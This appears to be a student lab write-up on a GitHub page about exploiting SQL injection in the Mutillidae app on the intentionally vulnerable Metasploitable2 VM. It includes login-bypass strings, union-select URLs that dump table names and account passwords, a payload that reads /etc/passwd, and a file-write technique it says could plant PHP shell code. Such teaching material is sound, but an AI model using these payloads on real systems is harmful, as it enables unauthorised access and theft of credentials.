# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2 ![280629167-ce267eca-0fb0-4769-a4c1-28ef3874e907](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/4b9f9e3d-865f-4191-b1ec-319d5a548126)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. Screenshot 2023-06-10 213747 ![280629356-347e2b79-0f9e-497b-938f-18225cc41356](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/85391548-3aa5-4141-8877-a34db392042f)


Select Multidae from the menu listed as shown above. You will get the page as displayed below: 
![280629532-f93dbdcb-a65f-49de-b9f1-2801e923f739](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/0043f20d-887a-4934-a2b3-1f76f962cfda)

Click on the menu Login/Register and register for an account ![280629670-ab9ec622-50da-448e-9c20-d7c4f6a726bf](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/7f159da1-7f7f-488d-80db-1284a34dbe67)


Click on the link “Please register here ![280629857-7df27d6d-2a3c-4856-8d63-215abc8cc2d9](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/65a64499-5a5d-4f93-8e7e-85ede268ab1a)


Click on “Create Account” to display the following page: ![280630591-37af75ae-f710-411a-9073-6d4577dcae2f](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/e1c87cfc-bfa9-4db9-ac5e-0e8a96dfd0d9)


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page. ![280630731-ded07f23-c3c3-4afb-924e-f8e9a399811f](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/ad1cf907-75c4-4511-a609-2f0595c14181)


Click “Login”. The logged in page will show as below ![280630890-8d46d742-d27b-4d4c-88bd-face5cd756bb](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/0dd2bfda-c19d-4fb2-8e0b-70e2be6442b2)


##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![280631145-857c32da-491b-4735-9277-97147979b9c7](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/a03c1ce7-e349-47fa-813b-355aa2afa10f)


Click the login button and you will see it enter into the administrator page. ![280631287-9bd9a613-6686-4a23-9291-77a5587b5b8e](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/273b55df-295b-4b88-a3a7-c3316c6fed66)

Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: img ![280631703-83c2cc83-a3f5-4864-9065-0a3426c3bcf5](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/421749b5-5369-474c-8230-62bab8f18b98)


![280631799-98fdd17e-d336-414b-82c4-498a7f363f9e](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/23784b92-05fd-431b-9b9d-d61f20da077e)


![280631903-4ffb740d-75ff-4a7a-99fd-32f6f3659f9c](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/0ca06109-39b2-45ca-8fce-91d929d083f1)


![280632027-e81d6411-a036-495a-bf53-b48dc86ec659](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/48cb8ea0-6dbb-4c2b-be12-9a39626571c1)


image From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned. ![280632139-cc9bb709-e05c-4aa2-9d92-ba60fff73fce](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/e5069e62-5a8c-449c-9272-f79ec53fb6c4)


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details ![280632732-f51f6d24-b173-4beb-84fa-ff998120acbb](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/566c31d2-3731-4db5-a392-a1442d128d1f)


After adding the order by 6 into the existing url , the following error statement will be obtained ![280632981-2775edc4-0acf-4f28-82c8-6aa6baee62c9](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/207f12c7-1c41-4a0a-baf7-fb74fb452f25)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6. ![280633227-96a104c2-7217-44d7-ba86-b9d0eea8bfc2](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/4e6cb4cd-1e64-44f3-881c-02b802a9d62f)


As it is having 5 columns the query worked fine and it provides the correct result image Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![280633527-8c09ba9e-3e99-4258-a59a-eb062b6419c7](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/2bc76a7c-e21a-488d-b551-02e685eed405)


As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information. image

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![280633720-48258dc8-3682-4559-b5b7-6e898be15877](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/d8087e9c-9958-4496-b4cc-838f31784259)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.![280633887-b61f8174-f8a9-4c45-b79f-0a171d6927aa](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/37e092f6-38bb-47b6-92dd-49d7fa7394a6)


Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details ![280634083-70be5b5a-20eb-4a3a-9a74-9e1f35d4dfd0](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/3203465b-21e5-4944-a7a7-11f2a7c8e6f4)


The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table. ![280634373-330dca50-b77d-4781-ac3d-5a460ee73dd5](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/48956e8e-ab0a-46c1-9cf1-3133ff840d4d)


The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details ![280634521-9644e75f-0adf-4e04-a2a0-1a2c8c3c9fa5](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/31f1cd39-c56d-48d1-9b01-0c6209571930)


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details ![280634649-a759dd2e-4fb1-4863-b5cf-fceba00fde1a](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/b58723ed-8034-403d-8aae-6e71f5483f4b)

Reading and writing files on the web-server

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later. Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![280634915-bf03d303-fd61-49e8-9cf8-c1f163d6ba92](https://github.com/Bakkiyalakshmi29/sqlinjection/assets/119406233/1a247450-5003-4bcc-86a8-0f905938e409)



the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
